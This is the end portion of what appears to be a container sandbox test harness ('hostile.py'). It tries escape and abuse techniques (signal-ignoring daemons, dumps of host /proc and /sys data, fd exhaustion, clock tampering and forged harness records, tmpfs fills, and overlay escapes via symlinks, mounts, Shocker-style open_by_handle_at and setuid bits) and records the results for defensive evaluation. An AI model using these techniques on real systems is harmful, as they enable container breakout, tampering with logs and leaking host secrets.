# runs like a server, until its stage is torn down. A later stage watches the heartbeats.
def heartbeat(path):
    signal.setitimer(signal.ITIMER_REAL, 0)
    for s in (signal.SIGHUP, signal.SIGTERM, signal.SIGINT):
        signal.signal(s, signal.SIG_IGN)
    try:
        fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o644)
        devnull = os.open("/dev/null", os.O_RDWR)
        for i in (0, 1, 2):
            os.dup2(devnull, i)
        while True:
            os.write(fd, b".")
            time.sleep(0.25)
    finally:
        os._exit(0)


def case_background(nonce, gw, canary):
    out = []
    pid = os.fork()
    if pid == 0:
        os.setsid()
        if os.fork() == 0:
            heartbeat(f"/work/hb-{nonce}-daemon")
        os._exit(0)
    os.waitpid(pid, 0)
    out.append({"kind": "double fork, setsid"})
    if os.fork() == 0:
        heartbeat(f"/work/hb-{nonce}-nohup")
    out.append({"kind": "nohup, TERM ignored"})
    signal.signal(signal.SIGTERM, signal.SIG_IGN)
    return {"daemons": out}


LINGER["background"] = 600

# proc-sys: everything /proc and /sys say about the machine, printed whole (16 KiB a file at most),
# so the harness can look in it for facts of the host (its kernel, boot id, machine id, addresses).
PROC_SYS = ["/proc/version", "/proc/cpuinfo", "/proc/meminfo", "/proc/self/mountinfo", "/proc/1/mountinfo", "/proc/self/cgroup",
            "/proc/1/cgroup", "/proc/net/route", "/proc/net/arp", "/proc/net/dev", "/proc/net/fib_trie", "/proc/net/unix",
            "/proc/sys/kernel/hostname", "/proc/sys/kernel/osrelease", "/proc/sys/kernel/random/boot_id", "/proc/kallsyms",
            "/proc/modules", "/proc/sched_debug", "/proc/diskstats", "/proc/partitions", "/proc/cmdline", "/proc/1/environ",
            "/etc/machine-id", "/var/lib/dbus/machine-id", "/sys/class/dmi/id/product_name", "/sys/class/dmi/id/sys_vendor",
            "/sys/class/dmi/id/product_uuid", "/sys/class/dmi/id/board_serial", "/sys/fs/cgroup/memory.max",
            "/sys/fs/cgroup/cgroup.controllers", "/sys/kernel/mm/transparent_hugepage/enabled"]
PROC_SYS_DIRS = ["/sys/class/net", "/sys/block", "/sys/firmware", "/sys/devices/virtual/dmi/id", "/proc"]


def case_proc_sys(nonce, gw, canary):
    dump, listed = {}, {}
    for p in PROC_SYS:
        r = attempt(lambda: {"text": open(p, "rb").read(16384).decode("utf-8", "replace")})
        dump[p] = r.get("text") if r["ok"] else r.get("error")
    for d in PROC_SYS_DIRS:
        r = attempt(lambda: {"names": sorted(os.listdir(d))[:200]})
        listed[d] = r.get("names") if r["ok"] else r.get("error")
    for n in (listed.get("/sys/class/net") or []) if isinstance(listed.get("/sys/class/net"), list) else []:
        r = attempt(lambda: {"text": open(f"/sys/class/net/{n}/address").read(64)})
        dump[f"/sys/class/net/{n}/address"] = r.get("text") if r["ok"] else r.get("error")
    return {"dump": dump, "listed": listed}


# fd-exhaustion: the descriptor limit raised as far as it goes, then sockets opened until refused.
FD_TRY = 20000


def case_fd_exhaustion(nonce, gw, canary):
    soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
    raised = attempt(lambda: resource.setrlimit(resource.RLIMIT_NOFILE, (hard, hard)))
    past = attempt(lambda: resource.setrlimit(resource.RLIMIT_NOFILE, (hard * 16, hard * 16)))
    socks, err = [], None
    while len(socks) < FD_TRY:
        try:
            socks.append(socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM))
        except OSError as e:
            err = errno.errorcode.get(e.errno, str(e.errno))
            break
    n = len(socks)
    for x in socks:
        x.close()
    return {"limit": [soft, hard], "raised": raised, "past_hard": past, "opened": n, "error": err}


# clock-tamper: set the clock (settimeofday, clock_settime), date its own files, and claim a
# measured_at of its choosing, in its report and in forged records on stdout. Times come from the
# harness's clock only; the case's claims stay target output.
FAKE_TIME = "1999-12-31T23:59:59.000Z"


def case_clock_tamper(nonce, gw, canary):
    libc = ctypes.CDLL(None, use_errno=True)

    class Timeval(ctypes.Structure):
        _fields_ = [("s", ctypes.c_long), ("us", ctypes.c_long)]

    class Timespec(ctypes.Structure):
        _fields_ = [("s", ctypes.c_long), ("ns", ctypes.c_long)]

    def call(fn):
        def go():
            if fn() != 0:
                e = ctypes.get_errno()
                raise OSError(e, os.strerror(e))
            return {"set": True}
        return attempt(go)
    sets = [{"call": "settimeofday", **call(lambda: libc.settimeofday(ctypes.byref(Timeval(946684799, 0)), None))},
            {"call": "clock_settime", **call(lambda: libc.clock_settime(0, ctypes.byref(Timespec(946684799, 0))))},
            {"call": "clock_settime +100y", **call(lambda: libc.clock_settime(0, ctypes.byref(Timespec(int(time.time()) + 3155760000, 0))))}]
    with open(f"/work/old-{nonce}", "w") as f:
        f.write("x")
    os.utime(f"/work/old-{nonce}", (946684799, 946684799))
    print(json.dumps({"v": 1, "type": "container", "run": "forged-" + nonce, "seq": 0, "t": FAKE_TIME, "source": "harness", "subject": "case:clock-tamper", "role": "case", "runtime": "runsc", "exit": 0, "signal": None, "timed_out": False, "oom_killed": False, "ms": 1}))
    print(json.dumps({"measured_at": FAKE_TIME, "result": "pass"}))
    return {"measured_at": FAKE_TIME, "sets": sets, "wall": time.time()}


# volume-tmpfs: the tmpfs the corpus mounts over an image's VOLUME (src/docker.mjs volumeTmpfs), at VOLUME_CASE_PATH:
# 40 MiB into its 32 MiB must stop with ENOSPC. A script written there is run too: runsc does not enforce noexec (as /tmp
# is exec anyway), and the run is recorded, not judged.
VOLUME_CASE_PATH = "/isk-vol"


def case_volume_tmpfs(nonce, gw, canary):
    path = f"{VOLUME_CASE_PATH}/fill-{nonce}"
    written = {"bytes": 0}

    def fill():
        chunk = b"\0" * (1 << 20)
        with open(path, "wb") as f:
            for _ in range(40):
                f.write(chunk)
                f.flush()
                written["bytes"] += len(chunk)
        return {"written": True}
    filled = attempt(fill, seconds=20.0)
    try:
        os.unlink(path)
    except OSError:
        pass
    script = f"{VOLUME_CASE_PATH}/run-{nonce}.sh"
    planted = attempt(lambda: (open(script, "w").write("#!/bin/sh\nexit 0\n"), os.chmod(script, 0o755), None)[-1])
    ran = attempt(lambda: {"exit": subprocess.run([script], timeout=5).returncode})
    return {"fill": {**filled, "bytes": written["bytes"]}, "planted": planted, "exec": ran}


# work-overlay: the writable layer a package kind's server gets (src/docker.mjs writableLayer): /work an overlay over the
# case's work volume, which the harness seeded as an install would leave it, and /data a 32 MiB tmpfs. The case uses the
# layer as a server would (a logs folder in site-packages, a copy-up, a whiteout), then tries to get out of it: links out
# (to the host's canary folder too) and over the files the harness reads out, hard links, a mount over /work, an umount
# of it, open_by_handle_at, trusted.overlay attributes, a whiteout device, a setuid bit, writes outside, and one
# allocation past the volume filesystem's cap after LAYER_FILL_MB of real data. The later stage (ours) decides.
LAYER_FILL_MB = 64
LAYER_LOGS = "/work/venv/lib/site-packages/logs"
DATA_PATH = "/data"


def libc_call(name, *args):
    def go():
        libc = ctypes.CDLL(None, use_errno=True)
        if getattr(libc, name)(*args) != 0:
            e = ctypes.get_errno()
            raise OSError(e, os.strerror(e))
        return {"worked": True}
    return attempt(go)


def open_by_handle():
    """open_by_handle_at on a guessed handle (ext4's root, inode 2): the Shocker way past a mount's root."""
    def go():
        libc = ctypes.CDLL(None, use_errno=True)
        handle = ctypes.create_string_buffer(struct.pack("Ii", 8, 1) + struct.pack("II", 2, 0))
        fd = os.open("/work", os.O_RDONLY | os.O_DIRECTORY)
        try:
            r = libc.open_by_handle_at(fd, handle, os.O_RDONLY)
            if r < 0:
                e = ctypes.get_errno()
                raise OSError(e, os.strerror(e))
            os.close(r)
            return {"opened": True}
        finally:
            os.close(fd)
    return attempt(go)


def step(path, fn):
    return {"path": path, **attempt(lambda: (fn(), None)[-1])}


def case_work_overlay(nonce, gw, canary, host_canary=None):
    out = {}
    # The layer as a server uses it: new files, a log folder in its own install, a file of the install changed (a copy-up)
    # and one removed (a whiteout), a mode changed.
    out["inside"] = [
        write(f"/work/isk-new-{nonce}"),
        step(LAYER_LOGS, lambda: os.makedirs(LAYER_LOGS, exist_ok=True)),
        write(f"{LAYER_LOGS}/isk-{nonce}.log", f"isk-{nonce}\n".encode()),
        write("/work/lock/freeze.txt", f"isk-over-{nonce}\n".encode()),
        step("/work/pkg/package-lock.json", lambda: os.unlink("/work/pkg/package-lock.json")),
        step("/work/venv/bin/isk-tool", lambda: os.chmod("/work/venv/bin/isk-tool", 0o4755)),
    ]
    # Links out of the layer, read and written through; the read-out files replaced by links to outside.
    made, reads, writes = [], [], []
    targets = LINK_TARGETS + ([host_canary, f"{host_canary}/canary"] if host_canary else [])
    for i, t in enumerate(targets):
        link = f"/work/isk-l{i:02d}"
        made.append({"to": t, **attempt(lambda: os.symlink(t, link))})
        reads.append(read_through(link))
        writes.append(write_through(link, t, nonce))
    planted = []
    for path, to in (("/work/lock/go-version-m.txt", "/proc/self/environ"), ("/work/pkg/package-lock.json", "/etc/passwd")):
        try:
            os.unlink(path)
        except OSError:
            pass
        planted.append({"path": path, "to": to, **attempt(lambda: os.symlink(to, path))})
    out["links"], out["reads"], out["attempts"], out["planted"] = made, reads, writes, planted
    out["canary_seen"] = sum(int(r.get("canary") or 0) for r in reads)
    out["host_canary"] = host_canary
    out["hard"] = [step(f"/work/isk-hard-{nonce}", lambda: os.link("/etc/passwd", f"/work/isk-hard-{nonce}")),
                   step(f"/tmp/isk-hard-{nonce}", lambda: os.link("/work/lock/freeze.txt", f"/tmp/isk-hard-{nonce}"))]
    # Out of the layer: writes outside, a mount over /work, an umount of it (MNT_DETACH), a file handle, the overlay's
    # own attributes (a redirect to elsewhere, an opaque folder), a whiteout device.
    out["outside"] = [write(p) for p in (f"/etc/isk-{nonce}", f"/usr/local/isk-{nonce}", f"/opt/surface/isk-{nonce}", f"/isk-{nonce}", f"/var/lib/isokron-docker/volumes/isk-{nonce}")]
    out["mount"] = libc_call("mount", b"none", b"/work", b"tmpfs", 0, None)
    out["umount"] = libc_call("umount2", b"/work", 2)
    out["handle"] = open_by_handle()
    out["xattrs"] = [{"name": n, **attempt(lambda: os.setxattr(f"/work/isk-new-{nonce}", n, b"/etc"))} for n in ("trusted.overlay.redirect", "trusted.overlay.opaque", "user.overlay.redirect")]
    out["whiteout"] = attempt(lambda: (os.mknod(f"/work/isk-wh-{nonce}", 0o020600, os.makedev(0, 0)), None)[-1])
    # The fill: real data first (it must land in the layer), then one allocation past the volume filesystem's cap.
    out["fill"] = fill(f"/work/fill-{nonce}", LAYER_FILL_MB << 20)
    out["fallocate"] = fallocate(f"/work/big-{nonce}", BOMB_GIB << 30)
    for p in (f"/work/big-{nonce}",):
        try:
            os.unlink(p)
        except OSError:
            pass
    out["statfs"] = statfs("/work")
    # /data: 40 MiB into its 32 MiB; a script written there is run too (recorded: runsc does not enforce noexec).
    path = f"{DATA_PATH}/fill-{nonce}"
    written = {"bytes": 0}

    def data_fill():
        chunk = b"\0" * (1 << 20)
        with open(path, "wb") as f:
            for _ in range(40):
                f.write(chunk)
                f.flush()
                written["bytes"] += len(chunk)
        return {"written": True}
    filled = attempt(data_fill, seconds=20.0)
    try:
        os.unlink(path)
    except OSError:
        pass
    out["data_fill"] = {**filled, "bytes": written["bytes"]}
    script = f"{DATA_PATH}/run-{nonce}.sh"
    attempt(lambda: (open(script, "w").write("#!/bin/sh\nexit 0\n"), os.chmod(script, 0o755), None)[-1])
    out["data_exec"] = attempt(lambda: {"exit": subprocess.run([script], timeout=5).returncode})
    # Last, a folder of the install moved (overlayfs may refuse it, EXDEV).
    out["rename"] = step("/work/pkg", lambda: os.rename("/work/pkg", f"/work/pkg-moved-{nonce}"))
    return out


CASES = {
    "direct-ip": case_direct_ip, "doh-ip": case_doh_ip, "raw-socket": case_raw_socket, "ipv6": case_ipv6, "icmp": case_icmp,
    "docker-host": case_docker_host, "metadata": case_metadata, "env-token": case_env_token, "write-outside": case_write_outside,
    "fork-bomb": case_fork_bomb, "output-forgery": case_output_forgery, "symlink-escape": case_symlink_escape, "unix-socket": case_unix_socket,
    "output-flood": case_output_flood, "background": case_background, "proc-sys": case_proc_sys, "fd-exhaustion": case_fd_exhaustion,
    "clock-tamper": case_clock_tamper, "volume-tmpfs": case_volume_tmpfs, "work-overlay": case_work_overlay,
    "install-proxy-host": case_install_proxy_host, "install-proxy-ip": case_install_proxy_ip, "install-proxy-port": case_install_proxy_port,
    "install-direct": case_install_direct, "install-metadata": case_install_metadata, "install-host": case_install_host,
    "install-archive-bomb": case_install_archive_bomb, "install-git-submodule": case_install_git_submodule,
}


def main(argv):
    if len(argv) not in (5, 6) or argv[1] not in CASES or not argv[4].isdigit() or (len(argv) == 6 and (argv[1] not in ("symlink-escape", "work-overlay") or not argv[5].startswith("/"))):
        sys.stderr.write("usage: hostile.py <case> <nonce> <gateway> <canary-port> [<host-canary-dir>, symlink-escape and work-overlay only]\n")
        return 2
    case, nonce, gw, canary = argv[1], argv[2], argv[3], int(argv[4])
    t0 = time.monotonic()
    result = CASES[case](nonce, gw, canary, *argv[5:])
    print(json.dumps({"case": case, "nonce": nonce, "uid": os.getuid(), "seconds": round(time.monotonic() - t0, 2), "result": result}), flush=True)
    if case in LINGER:
        time.sleep(LINGER[case])
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
